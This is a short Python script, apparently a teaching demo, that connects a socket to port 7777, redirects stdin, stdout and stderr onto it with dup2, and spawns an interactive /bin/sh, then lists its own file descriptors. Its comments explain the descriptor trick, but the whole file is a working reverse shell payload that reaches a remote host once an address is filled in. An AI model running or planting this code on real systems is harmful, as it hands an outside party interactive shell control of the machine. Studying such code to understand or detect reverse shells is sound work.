import socket
import subprocess
import os

pid = os.getpid()
print(pid)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("", 7777))
# overwrite the original stdin fd
os.dup2(s.fileno(), 0)
# overwrite the original stdout fd
os.dup2(s.fileno(), 1)
# overwrite the original stderr fd
os.dup2(s.fileno(), 2)

# by overwriting the original file descriptors
# we attach stdin, stdout, and stderr to the socket connection
# and then the shell that we spawn will inherit the original
# sockets file descriptors
p = subprocess.call(["/bin/sh", "-i"])

os.system("ls -l /proc/%s/fd" % pid)
